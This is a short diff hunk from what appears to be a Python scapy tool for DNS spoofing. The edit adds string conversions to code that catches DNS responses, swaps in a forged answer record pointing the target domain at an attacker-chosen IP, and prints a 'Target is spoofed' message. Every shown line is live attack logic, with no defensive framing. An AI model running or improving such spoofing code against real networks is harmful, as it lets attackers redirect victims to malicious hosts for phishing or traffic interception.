@@ -121,9 +121,9 @@ try:
         #print(ippacket.show())
         if ippacket.haslayer(sc.DNSRR):
             reqname = ippacket[sc.DNSQR].qname
-            if domain in str(reqname):
-                print("[Congrats] --> Target is spoofed and directed to "+ip+" ....")
-                anspof = sc.DNSRR(rrname=domain, rdata=ip)
+            if str(domain) in str(reqname):
+                print("[Congrats] --> Target is spoofed and directed to "+str(ip)+" ....")
+                anspof = sc.DNSRR(rrname=str(domain), rdata=str(ip))
                 ippacket[sc.DNS].an = anspof
                 ippacket[sc.DNS].ancount = 1
                 del ippacket[sc.IP].len
